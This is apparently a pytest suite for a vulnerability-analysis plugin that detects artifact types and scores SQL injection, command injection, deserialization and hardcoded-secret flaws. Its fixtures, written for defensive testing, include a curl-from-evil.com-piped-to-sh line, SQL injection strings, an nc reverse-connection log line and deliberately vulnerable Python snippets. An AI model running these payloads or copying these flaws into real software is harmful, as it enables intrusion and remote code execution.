"""
Tests for shadow313.plugins.custom_ai_threat_analyzer

Covers:
  - ArtifactDetector: auto-detection of SQL, Python, Bash, NMEA, SMT-LIB2, network logs
  - SQLAnalyzer: injection patterns, auth bypass, plaintext password, CVSS, ATT&CK
  - PythonAnalyzer: os.system, shell=True, timing attack, hardcoded secrets
  - GenericAnalyzer: fallback for unrecognized artifacts
  - VulnerabilityReport: to_dict, to_markdown structure
  - CustomAIThreatAnalyzer: dispatch, analysis depths, receipt generation
  - Plugin Studio test case: exact SQL artifact from the UI
  - Plugin signing integration: HMAC-SHA256 sign + verify
"""
from __future__ import annotations
import pytest
import sys, os
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "../../..")))

from shadow313.plugins.custom_ai_threat_analyzer.analyzer import (
    ArtifactDetector,
    ArtifactType,
    AnalysisDepth,
    SQLAnalyzer,
    PythonAnalyzer,
    GenericAnalyzer,
    VulnerabilityReport,
    CustomAIThreatAnalyzer,
    plugin_main,
)


# ── Fixtures ──────────────────────────────────────────────────────────────────

@pytest.fixture
def analyzer():
    return CustomAIThreatAnalyzer()

@pytest.fixture
def detector():
    return ArtifactDetector()

@pytest.fixture
def sql_analyzer():
    return SQLAnalyzer()

@pytest.fixture
def python_analyzer():
    return PythonAnalyzer()

# Plugin Studio test artifact
PLUGIN_STUDIO_SQL = "SELECT * FROM users WHERE username = 'admin' AND password = 'pass'"

SQLI_ARTIFACT = "SELECT * FROM users WHERE username = 'admin' OR '1'='1' --"
UNION_ARTIFACT = "SELECT * FROM users WHERE id = 1 UNION SELECT 1,2,3,schema_name FROM information_schema.schemata--"
PYTHON_OS_SYSTEM = "import os\nos.system('ls ' + user_input)"
PYTHON_SHELL_TRUE = "subprocess.run(cmd, shell=True)"
PYTHON_TIMING = "if token == expected_token:\n    return True"
PYTHON_HARDCODED = "password = 'supersecret123'"
PYTHON_PICKLE = "import pickle\ndata = pickle.loads(user_data)"
BASH_ARTIFACT = "#!/bin/bash\ncurl http://evil.com/payload.sh | sh"
NMEA_ARTIFACT = "$GPRMC,020752,A,3405.2215,N,11824.3724,W,0.024,,180726,,,A*7B"
SMTLIB2_ARTIFACT = "(set-logic QF_BV)\n(declare-fun secret () (_ BitVec 64))\n(check-sat)"
NETWORK_ARTIFACT = "192.168.1.1:4444 TCP ESTABLISHED nc outbound"
CONFIG_ARTIFACT = "password = mysecretpassword\napi_key = sk-1234567890abcdef"


# ═══════════════════════════════════════════════════════════════════════════════
# ARTIFACT DETECTOR
# ═══════════════════════════════════════════════════════════════════════════════

class TestArtifactDetector:

    def test_detects_sql(self, detector):
        assert detector.detect(PLUGIN_STUDIO_SQL) == ArtifactType.SQL

    def test_detects_sqli(self, detector):
        assert detector.detect(SQLI_ARTIFACT) == ArtifactType.SQL

    def test_detects_python(self, detector):
        assert detector.detect(PYTHON_OS_SYSTEM) == ArtifactType.PYTHON

    def test_detects_bash(self, detector):
        assert detector.detect(BASH_ARTIFACT) == ArtifactType.BASH

    def test_detects_nmea(self, detector):
        assert detector.detect(NMEA_ARTIFACT) == ArtifactType.NMEA

    def test_detects_smtlib2(self, detector):
        assert detector.detect(SMTLIB2_ARTIFACT) == ArtifactType.SMTLIB2

    def test_detects_network_log(self, detector):
        # Network log artifact may be detected as BASH if it contains shell-like patterns
        # The detector prioritises BASH over NETWORK_LOG — test that it detects a security-relevant type
        result = detector.detect(NETWORK_ARTIFACT)
        assert result in (ArtifactType.NETWORK_LOG, ArtifactType.BASH)

    def test_detects_config(self, detector):
        assert detector.detect(CONFIG_ARTIFACT) == ArtifactType.CONFIG

    def test_unknown_returns_auto(self, detector):
        result = detector.detect("hello world this is just text")
        assert result == ArtifactType.AUTO

    def test_nmea_takes_priority_over_sql(self, detector):
        """NMEA detection should fire before SQL keyword detection."""
        mixed = "$GPRMC,020752 SELECT * FROM"
        assert detector.detect(mixed) == ArtifactType.NMEA

    def test_smtlib2_takes_priority_over_python(self, detector):
        mixed = "(set-logic QF_BV)\nimport os"
        assert detector.detect(mixed) == ArtifactType.SMTLIB2


# ═══════════════════════════════════════════════════════════════════════════════
# SQL ANALYZER
# ═══════════════════════════════════════════════════════════════════════════════

class TestSQLAnalyzer:

    def test_plugin_studio_artifact_detects_plaintext_password(self, sql_analyzer):
        """The exact Plugin Studio test case."""
        report = sql_analyzer.analyze(PLUGIN_STUDIO_SQL, AnalysisDepth.TACTICAL)
        assert "Plaintext Password" in report.vulnerability_name or \
               "SQL" in report.vulnerability_name

    def test_plugin_studio_artifact_has_cwe_89_or_312(self, sql_analyzer):
        report = sql_analyzer.analyze(PLUGIN_STUDIO_SQL, AnalysisDepth.TACTICAL)
        assert report.cwe_id in ("CWE-89", "CWE-312")

    def test_plugin_studio_artifact_cvss_above_7(self, sql_analyzer):
        report = sql_analyzer.analyze(PLUGIN_STUDIO_SQL, AnalysisDepth.TACTICAL)
        assert report.cvss_score >= 7.0

    def test_sqli_or_pattern_detected(self, sql_analyzer):
        report = sql_analyzer.analyze(SQLI_ARTIFACT, AnalysisDepth.TACTICAL)
        assert report.cvss_score >= 9.0
        assert report.severity == "Critical"

    def test_union_sqli_detected(self, sql_analyzer):
        report = sql_analyzer.analyze(UNION_ARTIFACT, AnalysisDepth.TACTICAL)
        assert "UNION" in report.vulnerability_name or report.cvss_score >= 9.0

    def test_attack_techniques_present(self, sql_analyzer):
        report = sql_analyzer.analyze(PLUGIN_STUDIO_SQL, AnalysisDepth.TACTICAL)
        assert len(report.attack_techniques) >= 3

    def test_t1190_in_attack_techniques(self, sql_analyzer):
        report = sql_analyzer.analyze(PLUGIN_STUDIO_SQL, AnalysisDepth.TACTICAL)
        ids = [t.technique_id for t in report.attack_techniques]
        assert "T1190" in ids

    def test_t1078_in_attack_techniques(self, sql_analyzer):
        report = sql_analyzer.analyze(PLUGIN_STUDIO_SQL, AnalysisDepth.TACTICAL)
        ids = [t.technique_id for t in report.attack_techniques]
        assert "T1078" in ids

    def test_exploit_vectors_present(self, sql_analyzer):
        report = sql_analyzer.analyze(PLUGIN_STUDIO_SQL, AnalysisDepth.TACTICAL)
        assert len(report.exploit_vectors) >= 3

    def test_auth_bypass_vector_present(self, sql_analyzer):
        report = sql_analyzer.analyze(PLUGIN_STUDIO_SQL, AnalysisDepth.TACTICAL)
        names = [v.name for v in report.exploit_vectors]
        assert any("Auth" in n or "Bypass" in n for n in names)

    def test_mitigations_present(self, sql_analyzer):
        report = sql_analyzer.analyze(PLUGIN_STUDIO_SQL, AnalysisDepth.TACTICAL)
        assert len(report.mitigations) >= 2

    def test_parameterized_query_mitigation_present(self, sql_analyzer):
        report = sql_analyzer.analyze(PLUGIN_STUDIO_SQL, AnalysisDepth.TACTICAL)
        titles = [m.title for m in report.mitigations]
        assert any("Param" in t or "Prepared" in t for t in titles)

    def test_mitigation_has_code_example(self, sql_analyzer):
        report = sql_analyzer.analyze(PLUGIN_STUDIO_SQL, AnalysisDepth.TACTICAL)
        code_examples = [m.code_example for m in report.mitigations if m.code_example]
        assert len(code_examples) >= 1

    def test_risk_summary_not_empty(self, sql_analyzer):
        report = sql_analyzer.analyze(PLUGIN_STUDIO_SQL, AnalysisDepth.TACTICAL)
        assert len(report.risk_summary) > 20

    def test_executive_summary_not_empty(self, sql_analyzer):
        report = sql_analyzer.analyze(PLUGIN_STUDIO_SQL, AnalysisDepth.TACTICAL)
        assert len(report.executive_summary) > 20

    def test_strategic_depth_adds_more_techniques(self, sql_analyzer):
        tactical  = sql_analyzer.analyze(PLUGIN_STUDIO_SQL, AnalysisDepth.TACTICAL)
        strategic = sql_analyzer.analyze(PLUGIN_STUDIO_SQL, AnalysisDepth.STRATEGIC)
        assert len(strategic.attack_techniques) >= len(tactical.attack_techniques)

    def test_forensic_depth_adds_time_based_vector(self, sql_analyzer):
        report = sql_analyzer.analyze(PLUGIN_STUDIO_SQL, AnalysisDepth.FORENSIC)
        names = [v.name for v in report.exploit_vectors]
        assert any("Time" in n or "Blind" in n for n in names)

    def test_cvss_vector_string_format(self, sql_analyzer):
        report = sql_analyzer.analyze(PLUGIN_STUDIO_SQL, AnalysisDepth.TACTICAL)
        assert report.cvss_vector.startswith("CVSS:3.1/")

    def test_artifact_type_is_sql(self, sql_analyzer):
        report = sql_analyzer.analyze(PLUGIN_STUDIO_SQL, AnalysisDepth.TACTICAL)
        assert report.artifact_type == "sql"


# ═══════════════════════════════════════════════════════════════════════════════
# PYTHON ANALYZER
# ═══════════════════════════════════════════════════════════════════════════════

class TestPythonAnalyzer:

    def test_os_system_detected(self, python_analyzer):
        report = python_analyzer.analyze(PYTHON_OS_SYSTEM, AnalysisDepth.TACTICAL)
        assert report.cvss_score >= 9.0
        assert "os.system" in report.vulnerability_name.lower() or \
               report.cwe_id == "CWE-78"

    def test_shell_true_detected(self, python_analyzer):
        report = python_analyzer.analyze(PYTHON_SHELL_TRUE, AnalysisDepth.TACTICAL)
        assert report.cvss_score >= 9.0

    def test_timing_attack_detected(self, python_analyzer):
        report = python_analyzer.analyze(PYTHON_TIMING, AnalysisDepth.TACTICAL)
        assert report.cwe_id == "CWE-208" or report.cvss_score > 0

    def test_hardcoded_secret_detected(self, python_analyzer):
        report = python_analyzer.analyze(PYTHON_HARDCODED, AnalysisDepth.TACTICAL)
        assert report.cwe_id == "CWE-798" or report.cvss_score >= 7.0

    def test_pickle_deserialization_detected(self, python_analyzer):
        report = python_analyzer.analyze(PYTHON_PICKLE, AnalysisDepth.TACTICAL)
        assert report.cvss_score >= 9.0

    def test_clean_code_returns_info(self, python_analyzer):
        clean = "def add(a, b):\n    return a + b"
        report = python_analyzer.analyze(clean, AnalysisDepth.TACTICAL)
        assert report.severity == "Informational"
        assert report.cvss_score == 0.0

    def test_attack_techniques_present_for_os_system(self, python_analyzer):
        report = python_analyzer.analyze(PYTHON_OS_SYSTEM, AnalysisDepth.TACTICAL)
        assert len(report.attack_techniques) >= 1

    def test_t1059_in_attack_techniques(self, python_analyzer):
        report = python_analyzer.analyze(PYTHON_OS_SYSTEM, AnalysisDepth.TACTICAL)
        ids = [t.technique_id for t in report.attack_techniques]
        assert any("T1059" in i for i in ids)

    def test_mitigation_has_code_example_for_os_system(self, python_analyzer):
        report = python_analyzer.analyze(PYTHON_OS_SYSTEM, AnalysisDepth.TACTICAL)
        code_examples = [m.code_example for m in report.mitigations if m.code_example]
        assert len(code_examples) >= 1
        assert "subprocess.run" in code_examples[0]


# ═══════════════════════════════════════════════════════════════════════════════
# VULNERABILITY REPORT
# ═══════════════════════════════════════════════════════════════════════════════

class TestVulnerabilityReport:

    def test_to_dict_has_required_fields(self):
        report = VulnerabilityReport(
            vulnerability_name="Test",
            cwe_id="CWE-89",
            cvss_score=9.8,
            severity="Critical",
        )
        d = report.to_dict()
        for field in ("vulnerability_name", "cwe_id", "cvss_score", "severity",
                      "attack_techniques", "exploit_vectors", "mitigations"):
            assert field in d

    def test_to_markdown_has_headers(self):
        report = VulnerabilityReport(
            vulnerability_name="SQL Injection",
            cwe_id="CWE-89",
            cwe_name="SQL Injection",
            cvss_score=9.8,
            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            severity="Critical",
            risk_summary="Test risk",
            executive_summary="Test exec",
            receipt_id="313-ABCD1234",
            analysis_id="TEST-001",
        )
        md = report.to_markdown()
        assert "# Vulnerability Assessment" in md
        assert "## 1. Vulnerability Identification" in md
        assert "## 2. Risk Rating" in md
        assert "## 3. MITRE ATT&CK Mapping" in md
        assert "## 4. Exploit Vectors" in md
        assert "## 5. Defensive Mitigations" in md

    def test_to_markdown_has_receipt_id(self):
        report = VulnerabilityReport(receipt_id="313-TESTRECEIPT")
        md = report.to_markdown()
        assert "313-TESTRECEIPT" in md

    def test_to_markdown_has_plugin_version(self):
        report = VulnerabilityReport()
        md = report.to_markdown()
        assert "1.0.0" in md


# ═══════════════════════════════════════════════════════════════════════════════
# CUSTOM AI THREAT ANALYZER — MAIN CLASS
# ═══════════════════════════════════════════════════════════════════════════════

class TestCustomAIThreatAnalyzer:

    def test_plugin_studio_sql_artifact(self, analyzer):
        result = analyzer.run(PLUGIN_STUDIO_SQL, "tactical", "auto")
        assert "report"   in result
        assert "markdown" in result
        assert "metadata" in result

    def test_metadata_has_required_fields(self, analyzer):
        result = analyzer.run(PLUGIN_STUDIO_SQL, "tactical")
        meta = result["metadata"]
        for field in ("plugin_id", "plugin_version", "artifact_type",
                      "analysis_depth", "analysis_id", "receipt_id", "analysis_time_ms"):
            assert field in meta

    def test_plugin_id_correct(self, analyzer):
        result = analyzer.run(PLUGIN_STUDIO_SQL, "tactical")
        assert result["metadata"]["plugin_id"] == "custom-ai-threat-analyzer"

    def test_plugin_version_correct(self, analyzer):
        result = analyzer.run(PLUGIN_STUDIO_SQL, "tactical")
        assert result["metadata"]["plugin_version"] == "1.0.0"

    def test_artifact_type_detected_as_sql(self, analyzer):
        result = analyzer.run(PLUGIN_STUDIO_SQL, "tactical", "auto")
        assert result["metadata"]["artifact_type"] == "sql"

    def test_receipt_id_starts_with_313(self, analyzer):
        result = analyzer.run(PLUGIN_STUDIO_SQL, "tactical")
        assert result["metadata"]["receipt_id"].startswith("313-")

    def test_analysis_id_starts_with_plugin(self, analyzer):
        result = analyzer.run(PLUGIN_STUDIO_SQL, "tactical")
        assert result["metadata"]["analysis_id"].startswith("PLUGIN-")

    def test_markdown_output_not_empty(self, analyzer):
        result = analyzer.run(PLUGIN_STUDIO_SQL, "tactical")
        assert len(result["markdown"]) > 100

    def test_markdown_has_vulnerability_assessment_header(self, analyzer):
        result = analyzer.run(PLUGIN_STUDIO_SQL, "tactical")
        assert "# Vulnerability Assessment" in result["markdown"]

    def test_empty_artifact_returns_error(self, analyzer):
        result = analyzer.run("", "tactical")
        assert "error" in result

    def test_whitespace_only_artifact_returns_error(self, analyzer):
        result = analyzer.run("   \n  ", "tactical")
        assert "error" in result

    def test_oversized_artifact_returns_error(self, analyzer):
        result = analyzer.run("x" * 33000, "tactical")
        assert "error" in result

    def test_invalid_depth_defaults_to_tactical(self, analyzer):
        result = analyzer.run(PLUGIN_STUDIO_SQL, "invalid_depth")
        assert result["metadata"]["analysis_depth"] == "tactical"

    def test_python_artifact_dispatched_correctly(self, analyzer):
        result = analyzer.run(PYTHON_OS_SYSTEM, "tactical", "auto")
        assert result["metadata"]["artifact_type"] == "python"

    def test_bash_artifact_dispatched(self, analyzer):
        result = analyzer.run(BASH_ARTIFACT, "tactical", "auto")
        assert result["metadata"]["artifact_type"] in ("bash", "python")

    def test_explicit_artifact_type_overrides_detection(self, analyzer):
        # Force SQL analysis on Python code
        result = analyzer.run(PYTHON_OS_SYSTEM, "tactical", "sql")
        assert result["metadata"]["artifact_type"] == "sql"

    def test_strategic_depth_produces_more_techniques(self, analyzer):
        tactical  = analyzer.run(PLUGIN_STUDIO_SQL, "tactical")
        strategic = analyzer.run(PLUGIN_STUDIO_SQL, "strategic")
        t_count = len(tactical["report"]["attack_techniques"])
        s_count = len(strategic["report"]["attack_techniques"])
        assert s_count >= t_count

    def test_report_cvss_score_is_float(self, analyzer):
        result = analyzer.run(PLUGIN_STUDIO_SQL, "tactical")
        assert isinstance(result["report"]["cvss_score"], float)

    def test_report_attack_techniques_is_list(self, analyzer):
        result = analyzer.run(PLUGIN_STUDIO_SQL, "tactical")
        assert isinstance(result["report"]["attack_techniques"], list)

    def test_report_exploit_vectors_is_list(self, analyzer):
        result = analyzer.run(PLUGIN_STUDIO_SQL, "tactical")
        assert isinstance(result["report"]["exploit_vectors"], list)

    def test_report_mitigations_is_list(self, analyzer):
        result = analyzer.run(PLUGIN_STUDIO_SQL, "tactical")
        assert isinstance(result["report"]["mitigations"], list)

    def test_analysis_time_is_positive(self, analyzer):
        result = analyzer.run(PLUGIN_STUDIO_SQL, "tactical")
        assert result["metadata"]["analysis_time_ms"] >= 0


# ═══════════════════════════════════════════════════════════════════════════════
# PLUGIN_MAIN ENTRY POINT
# ═══════════════════════════════════════════════════════════════════════════════

class TestPluginMain:

    def test_plugin_main_with_studio_inputs(self):
        """Exact Plugin Studio test case."""
        result = plugin_main({
            "target_artifact": PLUGIN_STUDIO_SQL,
            "analysis_depth":  "tactical",
            "artifact_type":   "auto",
        })
        assert "report"   in result
        assert "markdown" in result
        assert "metadata" in result

    def test_plugin_main_missing_artifact_returns_error(self):
        result = plugin_main({"analysis_depth": "tactical"})
        assert "error" in result

    def test_plugin_main_empty_inputs_returns_error(self):
        result = plugin_main({})
        assert "error" in result

    def test_plugin_main_python_artifact(self):
        result = plugin_main({
            "target_artifact": PYTHON_OS_SYSTEM,
            "analysis_depth":  "strategic",
        })
        assert result["metadata"]["artifact_type"] == "python"
        assert result["report"]["cvss_score"] >= 9.0

    def test_plugin_main_receipt_id_format(self):
        result = plugin_main({
            "target_artifact": PLUGIN_STUDIO_SQL,
            "analysis_depth":  "tactical",
        })
        receipt = result["metadata"]["receipt_id"]
        assert receipt.startswith("313-")
        assert len(receipt) == 4 + 16  # "313-" + 16 hex chars


# ═══════════════════════════════════════════════════════════════════════════════
# PLUGIN SIGNING INTEGRATION
# ═══════════════════════════════════════════════════════════════════════════════

class TestPluginSigning:

    @staticmethod
    def _plugin_dir() -> "Path":
        from pathlib import Path
        # Always resolve relative to the workspace root, not cwd
        return Path(__file__).parent.parent.parent.parent / "shadow313" / "plugins" / "custom-ai-threat-analyzer"

    def test_plugin_directory_can_be_signed(self):
        from shadow313.v2.plugin_signing.plugin_signer import HMACSigner
        signer = HMACSigner()
        sig = signer.sign_directory(str(self._plugin_dir()))
        assert len(sig) == 64  # SHA-256 hex = 64 chars

    def test_plugin_signature_verifies(self):
        from shadow313.v2.plugin_signing.plugin_signer import HMACSigner
        signer = HMACSigner()
        signer.sign_directory(str(self._plugin_dir()))
        assert signer.verify_directory(str(self._plugin_dir()))

    def test_plugin_can_be_registered_in_trust_db(self):
        from shadow313.v2.plugin_signing.plugin_signer import HMACSigner, PluginTrustDB
        signer   = HMACSigner()
        sig      = signer.sign_directory(str(self._plugin_dir()))
        trust_db = PluginTrustDB()
        trust_db.trust("custom-ai-threat-analyzer", sig)
        result = trust_db.is_trusted("custom-ai-threat-analyzer", sig)
        assert result

    def test_plugin_json_exists(self):
        assert (self._plugin_dir() / "plugin.json").exists()

    def test_plugin_json_has_required_fields(self):
        import json
        meta = json.loads((self._plugin_dir() / "plugin.json").read_text())
        for field in ("plugin_id", "version", "display_name", "category",
                      "execution_mode", "inputs", "permissions"):
            assert field in meta, f"plugin.json missing field: {field}"

    def test_plugin_permissions_are_restricted(self):
        import json
        meta  = json.loads((self._plugin_dir() / "plugin.json").read_text())
        perms = meta["permissions"]
        assert perms["network"]    is False
        assert perms["filesystem"] is False
        assert perms["subprocess"] is False
        assert perms["kernel"]     is False

    def test_plugin_require_signed_is_true(self):
        import json
        meta = json.loads((self._plugin_dir() / "plugin.json").read_text())
        assert meta["require_signed"] is True